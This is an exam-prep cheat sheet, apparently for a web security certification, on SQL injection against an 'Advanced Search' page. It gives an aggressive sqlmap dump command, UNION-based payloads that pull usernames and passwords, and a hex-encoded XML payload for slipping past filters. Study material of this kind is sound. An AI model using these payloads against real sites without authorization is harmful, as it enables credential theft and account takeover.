## 🎯 Target Location

**Primary Target:** Advanced Search Page ⭐⭐⭐

If you see an "Advanced Search" page on the exam, you're likely getting an easy privilege escalation via SQL injection.

## 🔥 Quick Win: SQLMap

**RECOMMENDED APPROACH:** Use SQLMap with aggressive settings

```bash
sqlmap -r request.txt --level 5 --risk 3 --batch --dump
```

### SQLMap Workflow

1. **Capture Request** - Save search request to `request.txt`
2. **Run SQLMap** - Use command above
3. **Extract Credentials** - SQLMap will dump admin username/password
4. **Login as Admin** - Use extracted credentials

**Why SQLMap?**
- Saves time (exam is time-limited)
- Handles complex injection scenarios
- Automatically extracts data
- Works while you check other vulnerabilities

## 📋 Manual Injection (If Needed)

### Basic Union-Based Injection
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Determine Column Count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

### Extract Database Info
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Extract User Data
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT username || '~' || password,NULL FROM users--
```

## 🛡️ Special Cases

### XML-Based SQL Injection
**Context:** SQL injection in XML parameter (SQLMap won't work easily)

**Use Hackvertor Extension:**
```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

## 🎓 Exam Tips

1. **Use SQLMap first** - `--level 5 --risk 3` for comprehensive testing
2. **Run while multitasking** - SQLMap runs in background, check other app
3. **Check Advanced Search** - Highest probability location
4. **Try TrackingId cookie** - Another common injection point
5. **Use Hackvertor for XML** - Essential for XML-based injection

---
